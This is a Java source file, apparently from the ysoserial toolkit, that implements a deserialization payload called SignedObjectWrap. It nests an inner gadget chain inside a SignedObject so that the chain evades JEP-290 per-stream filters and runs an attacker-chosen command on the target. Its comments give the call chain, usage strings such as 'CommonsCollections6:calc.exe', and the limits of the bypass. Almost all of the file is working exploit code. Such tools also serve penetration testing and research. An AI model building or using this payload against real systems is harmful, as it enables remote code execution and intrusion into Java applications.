package ysoserial.payloads;

import java.io.Serializable;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.PriorityQueue;

import org.apache.commons.beanutils.BeanComparator;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	JEP-290 deserialization filter bypass via SignedObject secondary deserialization.

	SignedObject.getObject() creates a NEW ObjectInputStream that does NOT inherit
	the caller's ObjectInputFilter. This allows a blocked inner chain to execute
	inside the unfiltered secondary stream.

	Outer chain (CB2 variant — passes JEP-290 filter):
		PriorityQueue.readObject()
			BeanComparator.compare()
				PropertyUtils.getProperty(signedObject, "object")
					SignedObject.getObject()
						new ObjectInputStream(content)  ← UNFILTERED
							[inner chain deserializes freely]

	Usage: command format is "InnerPayload:actual_command"
		e.g. "CommonsCollections6:calc.exe"
		     "CommonsCollections2:id"

	The outer chain requires only commons-beanutils.
	The inner chain's dependencies must also be on the target classpath.

	Bypasses: JEP-290 per-stream filters that block inner chain classes
	Does NOT bypass: JDK global serial filters (jdk.serialFilter system property)

	Requires:
		commons-beanutils
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.BOFEI_CHEN })
public class SignedObjectWrap extends PayloadRunner implements ObjectPayload<PriorityQueue> {

	public PriorityQueue getObject(final String command) throws Exception {
		// Parse command: "InnerPayload:actual_command"
		final String[] parts = command.split(":", 2);
		if (parts.length != 2) {
			throw new IllegalArgumentException(
				"Command format: InnerPayload:actual_command (e.g. CommonsCollections6:calc.exe)");
		}
		final String innerPayloadName = parts[0];
		final String innerCommand = parts[1];

		// Generate inner payload
		final Class<? extends ObjectPayload> innerClass =
			ObjectPayload.Utils.getPayloadClass(innerPayloadName);
		if (innerClass == null) {
			throw new IllegalArgumentException("Unknown inner payload: " + innerPayloadName);
		}
		final ObjectPayload innerPayload = innerClass.newInstance();
		final Object innerObject = innerPayload.getObject(innerCommand);

		// Wrap in SignedObject (signature not verified by getObject())
		final KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
		kpg.initialize(1024);
		final KeyPair kp = kpg.generateKeyPair();
		final SignedObject signedObject = new SignedObject(
			(Serializable) innerObject,
			kp.getPrivate(),
			Signature.getInstance("SHA1withDSA")
		);

		// Outer chain: CB2 pattern with property="object" → calls getObject()
		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		// Arm: set property to "object" and swap queue contents
		Reflections.setFieldValue(comparator, "property", "object");
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = signedObject;
		queueArray[1] = signedObject;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(SignedObjectWrap.class, args);
	}
}
